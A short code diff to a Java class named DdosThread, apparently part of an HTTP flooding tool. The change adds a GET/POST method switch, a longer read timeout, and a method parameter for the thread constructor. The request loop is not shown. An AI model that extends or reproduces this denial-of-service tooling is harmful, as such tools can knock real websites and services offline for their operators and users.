@@ -16,6 +16,9 @@ import java.util.concurrent.atomic.AtomicBoolean;
 
 public class DdosThread extends Thread{
 
+    private static String POST_Method = "POST";
+    private static String GET_Method = "GET";
+
 
     private static int autoId = 0;
 
@@ -27,13 +30,14 @@ public class DdosThread extends Thread{
 
     private String request;
     private URL url;
+    private RequestMethods metodo;
 
     String param = null;
 
-    public DdosThread(ConsoleStateQueue colaDatos){
+    public DdosThread(RequestMethods metodo, ConsoleStateQueue colaDatos){
         this.colaDatos = colaDatos;
         this.id = ++autoId;
-
+        this.metodo = metodo;
         run = true;
     }
 
@@ -68,10 +72,29 @@ public class DdosThread extends Thread{
 
         //Creamos un objeto connection
         connection = (HttpURLConnection) this.url.openConnection();
-        connection.setReadTimeout(5000);
+        connection.setReadTimeout(10000);
         connection.setUseCaches(false);
         connection.setRequestProperty("charset", "utf-8");
         connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+        connection.setUseCaches(false);
+
+        //escogemos el metodo de envio
+        switch(metodo) {
+
+            case GET:
+                connection.setRequestMethod(GET_Method);
+            break;
+
+            case POST:
+                connection.setRequestMethod(POST_Method);
+                break;
+
+            default:
+                connection.setRequestMethod(GET_Method);
+                break;
+        }
+
+
         connection.setDoInput(true);
         connection.setDoOutput(true);
 
